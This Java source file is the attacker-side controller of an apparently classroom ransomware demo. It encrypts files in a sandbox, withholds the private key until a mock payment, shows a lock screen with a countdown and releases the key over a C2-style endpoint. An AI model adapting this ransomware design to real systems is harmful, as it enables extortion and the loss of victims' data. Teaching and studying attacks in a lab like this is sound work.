package ransomware.controller;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import ransomware.AppConfig;
import ransomware.crypto.CryptoAdapter;
import ransomware.crypto.DecryptionResult;
import ransomware.crypto.EncryptionResult;
import ransomware.recovery.CountdownService;
import ransomware.session.DemoSession;
import ransomware.session.SessionManager;
import ransomware.session.SessionStatus;
import ransomware.session.db.DatabaseManager;
import ransomware.sandbox.SandboxManager;
import ransomware.ui.LockScreen;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Optional;
import java.util.concurrent.Executors;

/**
 * Demo Controller — HTTP orchestrator on 127.0.0.1:5000.
 * Attacker-side component: owns sessions.db and private keys.
 */
public final class DemoController {

    private static final int PORT = 5000;
    private static final long DEMO_COUNTDOWN_SECONDS = 36 * 60; // 36 minutes

    // Portal URL is configurable via app.properties (supports 2-machine demo)
    private static final String PORTAL_URL = AppConfig.portalUrl();

    private static final SessionManager sessionMgr = new SessionManager();
    private static final CountdownService countdown = new CountdownService();

    // Track LockScreen instance per session
    private static final java.util.Map<String, LockScreen> lockScreens =
        new java.util.concurrent.ConcurrentHashMap<>();

    public static void main(String[] args) throws Exception {
        DatabaseManager.initSchema();
        try (java.sql.Connection conn = DatabaseManager.getConnection()) {
            ransomware.session.SessionIdGenerator.initFromDb(conn);
        }

        // Bind to all interfaces (0.0.0.0) so VM (victim) can reach Host (attacker)
        HttpServer server = HttpServer.create(
            new InetSocketAddress(PORT), 0);
        server.setExecutor(Executors.newSingleThreadExecutor(r -> {
            Thread t = new Thread(r, "http-handler");
            t.setDaemon(false);
            return t;
        }));

        server.createContext("/api/game/closed",        DemoController::handleGameClosed);
        server.createContext("/api/session/latest",     DemoController::handleLatestSession);
        server.createContext("/api/session/",           DemoController::handleSessionById);
        server.createContext("/api/payment/demo",       DemoController::handleDemoPayment);
        server.createContext("/api/recovery/key/",      DemoController::handleKeyRelease);
        server.createContext("/api/recovery/restore/",  DemoController::handleRestore);
        server.createContext("/api/recovery/",          DemoController::handleRecovery);
        server.createContext("/api/db/inspect",         DemoController::handleDbInspect);
        server.createContext("/api/sandbox/files/",     DemoController::handleSandboxFiles);

        server.start();

        System.out.println("==============================================");
        System.out.println(" PIXEL CHASER DEMO CONTROLLER  [ATTACKER]");
        System.out.println("==============================================");
        System.out.println("Listening : http://" + ransomware.AppConfig.attackerHost() + ":" + PORT + " (0.0.0.0:" + PORT + ")");
        System.out.println("DB        : " + DatabaseManager.getDbPath());
        System.out.println("Portal    : " + PORTAL_URL);
        System.out.println("Countdown : " + DEMO_COUNTDOWN_SECONDS + "s ("
            + (DEMO_COUNTDOWN_SECONDS / 60) + " min)");
        System.out.println("==============================================");
    }

    // ============================================================
    // POST /api/game/closed
    // ============================================================
    private static void handleGameClosed(HttpExchange ex) throws IOException {
        if (!"POST".equalsIgnoreCase(ex.getRequestMethod())) {
            sendJson(ex, 405, "{\"success\":false,\"error\":\"Method Not Allowed\"}");
            return;
        }

        try {
            String body = readBody(ex);
            String instanceId = extractJson(body, "instanceId");
            if (instanceId == null || instanceId.isBlank()) {
                sendJson(ex, 400, "{\"success\":false,\"error\":\"missing_instanceId\"}");
                return;
            }

            System.out.println();
            System.out.println("[GAME_CLOSED] instanceId = " + instanceId);

            // 1. Create session
            DemoSession session = sessionMgr.createSession(
                instanceId, DEMO_COUNTDOWN_SECONDS);
            System.out.println("  [1] Session: " + session.getRecoveryId());

            // 2. Prepare sandbox workspace
            SandboxManager sm = new SandboxManager(session.getRecoveryId());
            sm.prepareWorkspace();
            System.out.println("  [2] Workspace prepared");

            // 3. Transition to LOCKED
            session = sessionMgr.transition(
                session.getRecoveryId(), SessionStatus.LOCKED);

            // 4. Encrypt via adapter
            CryptoAdapter adapter = new CryptoAdapter();
            EncryptionResult enc = adapter.encrypt(session.getRecoveryId());
            System.out.println("  [3] Encrypted: " + enc.processedCount
                + " files (failed: " + enc.failedCount + ")");

            // 5. Store private key in DB (attacker side only — file already deleted)
            String privB64 = enc.privateKeyB64;
            sessionMgr.storeKey(session.getRecoveryId(), privB64);
            System.out.println("  [4] Private key stored in DB ("
                + privB64.length() + " b64 chars) — NOT on victim disk");

            // 6. Transition to PAYMENT_PENDING
            session = sessionMgr.transition(
                session.getRecoveryId(), SessionStatus.PAYMENT_PENDING);
            System.out.println("  [5] Status: PAYMENT_PENDING");

            // 7. Launch LockScreen (background thread) — pass PORTAL_URL
            launchLockScreen(session);

            // 8. Start countdown with expiry callback
            final String rid = session.getRecoveryId();
            countdown.start(rid, DEMO_COUNTDOWN_SECONDS, DemoController::onSessionExpired);
            System.out.println("  [6] Countdown started (" + DEMO_COUNTDOWN_SECONDS + "s)");

            sendJson(ex, 200, sessionToJson(session));

        } catch (Exception e) {
            System.err.println();
            System.err.println("[ERROR] handleGameClosed: " + e.getMessage());
            e.printStackTrace();
            sendJson(ex, 500, "{\"success\":false,\"error\":\""
                + escape(e.getClass().getSimpleName() + ": " + e.getMessage()) + "\"}");
        }
    }

    private static void launchLockScreen(DemoSession session) {
        final int remaining = (int) Math.max(0,
            (session.getExpiresAt() - java.time.Instant.now().getEpochSecond()));

        LockScreen lock = new LockScreen(
            session.getRecoveryId(),
            session.getPaymentStatus().name(),
            remaining,
            PORTAL_URL);  // Pass dynamic portal URL

        lockScreens.put(session.getRecoveryId(), lock);
        lock.showWindow();
        System.out.println("  [UI] LockScreen displayed — Portal: " + PORTAL_URL);
    }

    private static void onSessionExpired(String recoveryId) {
        try {
            Optional<DemoSession> opt = sessionMgr.findByRecoveryId(recoveryId);
            if (opt.isEmpty()) return;

            DemoSession s = opt.get();
            if (s.getStatus() != SessionStatus.PAYMENT_PENDING) return;

            sessionMgr.transition(recoveryId, SessionStatus.EXPIRED);
            sessionMgr.transition(recoveryId, SessionStatus.DATA_UNAVAILABLE);
            System.out.println("  [EXPIRED] " + recoveryId + " → DATA_UNAVAILABLE");

            LockScreen lock = lockScreens.remove(recoveryId);
            if (lock != null) {
                javax.swing.SwingUtilities.invokeLater(
                    () -> lock.updatePaymentStatus("EXPIRED"));
            }
        } catch (Exception e) {
            System.err.println("[onSessionExpired] " + e.getMessage());
        }
    }

    // ============================================================
    // GET /api/session/latest
    // ============================================================
    private static void handleLatestSession(HttpExchange ex) throws IOException {
        if (!"GET".equalsIgnoreCase(ex.getRequestMethod())) {
            sendJson(ex, 405, "{\"success\":false,\"error\":\"Method Not Allowed\"}");
            return;
        }
        try {
            Optional<DemoSession> opt = sessionMgr.findLatest();
            if (opt.isEmpty()) {
                sendJson(ex, 200, "{\"found\":false}");
                return;
            }
            sendJson(ex, 200, sessionToJson(opt.get()));
        } catch (Exception e) {
            sendJson(ex, 500, "{\"success\":false,\"error\":\""
                + escape(e.getMessage()) + "\"}");
        }
    }

    // ============================================================
    // GET /api/session/{rid}
    // ============================================================
    private static void handleSessionById(HttpExchange ex) throws IOException {
        String path = ex.getRequestURI().getPath();
        String prefix = "/api/session/";
        String rid = path.substring(prefix.length());
        if (rid.isBlank()) {
            sendJson(ex, 400, "{\"success\":false,\"error\":\"missing_recovery_id\"}");
            return;
        }
        try {
            Optional<DemoSession> opt = sessionMgr.findByRecoveryId(rid);
            if (opt.isEmpty()) {
                sendJson(ex, 404, "{\"found\":false,\"error\":\"Session not found\"}");
                return;
            }
            sendJson(ex, 200, sessionToJson(opt.get()));
        } catch (Exception e) {
            sendJson(ex, 500, "{\"success\":false,\"error\":\""
                + escape(e.getMessage()) + "\"}");
        }
    }

    // ============================================================
    // POST /api/payment/demo
    // ============================================================
    private static void handleDemoPayment(HttpExchange ex) throws IOException {
        if (!"POST".equalsIgnoreCase(ex.getRequestMethod())) {
            sendJson(ex, 405, "{\"success\":false,\"error\":\"Method Not Allowed\"}");
            return;
        }
        try {
            String body = readBody(ex);
            String rid = extractJson(body, "recoveryId");
            if (rid == null || rid.isBlank()) {
                sendJson(ex, 400, "{\"success\":false,\"error\":\"missing_recoveryId\"}");
                return;
            }

            // Guard: only allow payment on PAYMENT_PENDING sessions
            Optional<DemoSession> check = sessionMgr.findByRecoveryId(rid);
            if (check.isEmpty()) {
                sendJson(ex, 404, "{\"success\":false,\"error\":\"Session not found\"}");
                return;
            }
            if (check.get().getStatus() != SessionStatus.PAYMENT_PENDING) {
                sendJson(ex, 400, "{\"success\":false,\"error\":\"Session not in PAYMENT_PENDING state\"}");
                return;
            }

            System.out.println();
            System.out.println("[DEMO_PAYMENT] recoveryId = " + rid);

            DemoSession session = sessionMgr.confirmPayment(rid);
            session = sessionMgr.transition(rid, SessionStatus.RECOVERY_AVAILABLE);

            // Cancel countdown (payment confirmed)
            countdown.cancel(rid);

            // Update LockScreen payment status
            LockScreen lock = lockScreens.get(rid);
            if (lock != null) {
                javax.swing.SwingUtilities.invokeLater(
                    () -> lock.updatePaymentStatus("CONFIRMED"));
            }

            System.out.println("  [1] Payment: CONFIRMED");
            System.out.println("  [2] Status: RECOVERY_AVAILABLE");
            System.out.println("  [3] Key available for victim download via /api/recovery/key/" + rid);

            sendJson(ex, 200, sessionToJson(session));
        } catch (IllegalArgumentException | IllegalStateException e) {
            sendJson(ex, 400, "{\"success\":false,\"error\":\""
                + escape(e.getMessage()) + "\"}");
        } catch (Exception e) {
            sendJson(ex, 500, "{\"success\":false,\"error\":\""
                + escape(e.getMessage()) + "\"}");
        }
    }

    // ============================================================
    // GET /api/recovery/key/{rid}
    // NEW: Releases the private key to victim ONLY after payment confirmed.
    // This is the C2 key-release mechanism.
    // ============================================================
    private static void handleKeyRelease(HttpExchange ex) throws IOException {
        if (!"GET".equalsIgnoreCase(ex.getRequestMethod())) {
            sendJson(ex, 405, "{\"success\":false,\"error\":\"Method Not Allowed\"}");
            return;
        }
        String path = ex.getRequestURI().getPath();
        String rid = path.substring("/api/recovery/key/".length());
        if (rid.isBlank()) {
            sendJson(ex, 400, "{\"success\":false,\"error\":\"missing_recovery_id\"}");
            return;
        }
        try {
            Optional<DemoSession> opt = sessionMgr.findByRecoveryId(rid);
            if (opt.isEmpty()) {
                sendJson(ex, 404, "{\"success\":false,\"error\":\"Session not found\"}");
                return;
            }
            DemoSession s = opt.get();

            // Only release key if payment is confirmed and session is RECOVERY_AVAILABLE
            if (s.getStatus() != SessionStatus.RECOVERY_AVAILABLE) {
                sendJson(ex, 403, "{\"success\":false,\"error\":\"Key not released: payment not confirmed\"}");
                return;
            }

            Optional<String> keyOpt = sessionMgr.getPrivateKey(rid);
            if (keyOpt.isEmpty()) {
                sendJson(ex, 404, "{\"success\":false,\"error\":\"Key not found in database\"}");
                return;
            }

            System.out.println("[KEY_RELEASE] Releasing private key for: " + rid);
            sendJson(ex, 200, String.format(
                "{\"success\":true,\"recoveryId\":\"%s\",\"privateKeyB64\":\"%s\"}",
                escape(rid), keyOpt.get()));

        } catch (Exception e) {
            sendJson(ex, 500, "{\"success\":false,\"error\":\""
                + escape(e.getMessage()) + "\"}");
        }
    }

    // ============================================================
    // POST /api/recovery/restore/{rid}
    // NEW: Triggers server-side decryption (single-machine demo mode).
    // In 2-machine mode, victim calls decryptWithKey locally.
    // ============================================================
    private static void handleRestore(HttpExchange ex) throws IOException {
        if (!"POST".equalsIgnoreCase(ex.getRequestMethod())) {
            sendJson(ex, 405, "{\"success\":false,\"error\":\"Method Not Allowed\"}");
            return;
        }
        String path = ex.getRequestURI().getPath();
        String rid = path.substring("/api/recovery/restore/".length());
        if (rid.isBlank()) {
            sendJson(ex, 400, "{\"success\":false,\"error\":\"missing_recovery_id\"}");
            return;
        }
        try {
            Optional<DemoSession> opt = sessionMgr.findByRecoveryId(rid);
            if (opt.isEmpty()) {
                sendJson(ex, 404, "{\"success\":false,\"error\":\"Session not found\"}");
                return;
            }
            DemoSession s = opt.get();
            if (s.getStatus() != SessionStatus.RECOVERY_AVAILABLE) {
                sendJson(ex, 400, "{\"success\":false,\"error\":\"Session not RECOVERY_AVAILABLE\"}");
                return;
            }

            Optional<String> keyOpt = sessionMgr.getPrivateKey(rid);
            if (keyOpt.isEmpty()) {
                sendJson(ex, 404, "{\"success\":false,\"error\":\"Private key not in DB\"}");
                return;
            }

            System.out.println("[RESTORE] Starting restore for: " + rid);
            sessionMgr.transition(rid, SessionStatus.RESTORING);

            CryptoAdapter adapter = new CryptoAdapter();
            DecryptionResult dec = adapter.decryptWithKey(rid, keyOpt.get());

            if (dec.failedCount == 0 && dec.restoredCount > 0) {
                sessionMgr.transition(rid, SessionStatus.VERIFYING);
                sessionMgr.transition(rid, SessionStatus.COMPLETED);
                System.out.println("  [RESTORE] OK: " + dec.restoredCount + " files");

                LockScreen lock = lockScreens.remove(rid);
                if (lock != null) {
                    javax.swing.SwingUtilities.invokeLater(lock::closeWindow);
                }
            } else {
                // Hash mismatch or partial failure — leave in RESTORING for retry
                System.out.println("  [RESTORE] Partial failure: "
                    + dec.failedCount + " files failed");
            }

            sendJson(ex, 200, String.format(
                "{\"success\":%b,\"restored\":%d,\"failed\":%d,\"durationMs\":%d}",
                dec.success, dec.restoredCount, dec.failedCount, dec.durationMs));

        } catch (Exception e) {
            sendJson(ex, 500, "{\"success\":false,\"error\":\""
                + escape(e.getMessage()) + "\"}");
        }
    }

    // ============================================================
    // GET /api/recovery/status/{rid}
    // ============================================================
    private static void handleRecovery(HttpExchange ex) throws IOException {
        String path = ex.getRequestURI().getPath();
        if (path.startsWith("/api/recovery/status/")) {
            String rid = path.substring("/api/recovery/status/".length());
            try {
                Optional<DemoSession> opt = sessionMgr.findByRecoveryId(rid);
                if (opt.isEmpty()) {
                    sendJson(ex, 404, "{\"found\":false,\"error\":\"Session not found\"}");
                    return;
                }
                sendJson(ex, 200, sessionToJson(opt.get()));
            } catch (Exception e) {
                sendJson(ex, 500, "{\"success\":false,\"error\":\""
                    + escape(e.getMessage()) + "\"}");
            }
            return;
        }
        sendJson(ex, 404, "{\"success\":false,\"error\":\"Unknown endpoint\"}");
    }

    // ============================================================
    // GET /api/db/inspect
    // Interactive DB inspector for presentations & professor evaluation
    // ============================================================
    private static void handleDbInspect(HttpExchange ex) throws IOException {
        if (!"GET".equalsIgnoreCase(ex.getRequestMethod())) {
            sendJson(ex, 405, "{\"error\":\"Method Not Allowed\"}");
            return;
        }
        try (java.sql.Connection conn = DatabaseManager.getConnection()) {
            StringBuilder sb = new StringBuilder("{");

            // 1. Sessions
            sb.append("\"sessions\":[");
            try (var st = conn.createStatement();
                 var rs = st.executeQuery("SELECT * FROM sessions ORDER BY created_at DESC LIMIT 10")) {
                boolean first = true;
                while (rs.next()) {
                    if (!first) sb.append(",");
                    first = false;
                    sb.append(String.format("{\"sessionId\":\"%s\",\"recoveryId\":\"%s\",\"status\":\"%s\",\"paymentStatus\":\"%s\",\"createdAt\":%d}",
                        escape(rs.getString("session_id")), escape(rs.getString("recovery_id")),
                        escape(rs.getString("status")), escape(rs.getString("payment_status")), rs.getLong("created_at")));
                }
            }
            sb.append("],");

            // 2. Recovery keys
            sb.append("\"recoveryKeys\":[");
            try (var st = conn.createStatement();
                 var rs = st.executeQuery("SELECT recovery_id, key_id, status, created_at, released_at, private_key_b64, length(private_key_b64) as key_len FROM recovery_keys ORDER BY created_at DESC LIMIT 10")) {
                boolean first = true;
                while (rs.next()) {
                    if (!first) sb.append(",");
                    first = false;
                    sb.append(String.format("{\"recoveryId\":\"%s\",\"keyId\":\"%s\",\"status\":\"%s\",\"keyLen\":%d,\"releasedAt\":%d,\"privateKeyB64\":\"%s\"}",
                        escape(rs.getString("recovery_id")), escape(rs.getString("key_id")),
                        escape(rs.getString("status")), rs.getInt("key_len"), rs.getLong("released_at"),
                        escape(rs.getString("private_key_b64"))));
                }
            }
            sb.append("],");

            // 3. File manifest (SHA-256 integrity records)
            sb.append("\"fileManifest\":[");
            try (var st = conn.createStatement();
                 var rs = st.executeQuery("SELECT recovery_id, original_name, original_sha256, current_name, current_sha256, restore_status FROM file_manifest ORDER BY id DESC LIMIT 20")) {
                boolean first = true;
                while (rs.next()) {
                    if (!first) sb.append(",");
                    first = false;
                    sb.append(String.format("{\"recoveryId\":\"%s\",\"originalName\":\"%s\",\"origSha256\":\"%s\",\"currentName\":\"%s\",\"currSha256\":\"%s\",\"restoreStatus\":\"%s\"}",
                        escape(rs.getString("recovery_id")), escape(rs.getString("original_name")),
                        escape(rs.getString("original_sha256")), escape(rs.getString("current_name")),
                        escape(rs.getString("current_sha256")), escape(rs.getString("restore_status"))));
                }
            }
            sb.append("]");

            sb.append("}");
            sendJson(ex, 200, sb.toString());
        } catch (Exception e) {
            sendJson(ex, 500, "{\"error\":\"" + escape(e.getMessage()) + "\"}");
        }
    }

    // ============================================================
    // GET /api/sandbox/files/{rid}
    // Interactive file monitor for sandbox working folder
    // ============================================================
    private static void handleSandboxFiles(HttpExchange ex) throws IOException {
        String path = ex.getRequestURI().getPath();
        String prefix = "/api/sandbox/files/";
        String rid = path.substring(prefix.length()).trim();
        if (rid.isBlank()) {
            sendJson(ex, 400, "{\"error\":\"missing_recovery_id\"}");
            return;
        }
        try {
            java.nio.file.Path workingDir = java.nio.file.Paths.get(AppConfig.sandboxRoot())
                .resolve("working").resolve(rid);
            StringBuilder sb = new StringBuilder("{\"path\":\"" + escape(workingDir.toString()) + "\",\"files\":[");
            if (Files.isDirectory(workingDir)) {
                try (var stream = Files.list(workingDir)) {
                    var list = stream.filter(Files::isRegularFile).collect(java.util.stream.Collectors.toList());
                    for (int i = 0; i < list.size(); i++) {
                        var f = list.get(i);
                        String name = f.getFileName().toString();
                        long sz = Files.size(f);
                        boolean isLocked = name.endsWith(".locked");
                        if (i > 0) sb.append(",");
                        sb.append(String.format("{\"name\":\"%s\",\"size\":%d,\"isLocked\":%b}",
                            escape(name), sz, isLocked));
                    }
                }
            }
            sb.append("]}");
            sendJson(ex, 200, sb.toString());
        } catch (Exception e) {
            sendJson(ex, 500, "{\"error\":\"" + escape(e.getMessage()) + "\"}");
        }
    }

    // ============================================================
    // HELPERS
    // ============================================================
    private static String sessionToJson(DemoSession s) {
        return String.format(
            "{\"found\":true,\"sessionId\":\"%s\",\"recoveryId\":\"%s\"," +
            "\"instanceId\":\"%s\",\"status\":\"%s\",\"paymentStatus\":\"%s\"," +
            "\"createdAt\":%d,\"expiresAt\":%d}",
            escape(s.getSessionId()),
            escape(s.getRecoveryId()),
            escape(s.getInstanceId()),
            s.getStatus().name(),
            s.getPaymentStatus().name(),
            s.getCreatedAt(),
            s.getExpiresAt());
    }

    private static String readBody(HttpExchange ex) throws IOException {
        return new String(ex.getRequestBody().readAllBytes(),
            StandardCharsets.UTF_8);
    }

    private static String extractJson(String json, String key) {
        String token = "\"" + key + "\"";
        int k = json.indexOf(token);
        if (k < 0) return null;
        int colon = json.indexOf(':', k + token.length());
        if (colon < 0) return null;
        int q1 = json.indexOf('"', colon + 1);
        if (q1 < 0) return null;
        int q2 = json.indexOf('"', q1 + 1);
        if (q2 < 0) return null;
        return json.substring(q1 + 1, q2);
    }

    private static String escape(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    private static void sendJson(HttpExchange ex, int status, String body)
            throws IOException {
        byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
        ex.getResponseHeaders().set("Content-Type",
            "application/json; charset=UTF-8");
        ex.getResponseHeaders().set("Access-Control-Allow-Origin", "*");
        ex.sendResponseHeaders(status, bytes.length);
        try (OutputStream os = ex.getResponseBody()) {
            os.write(bytes);
        }
    }
}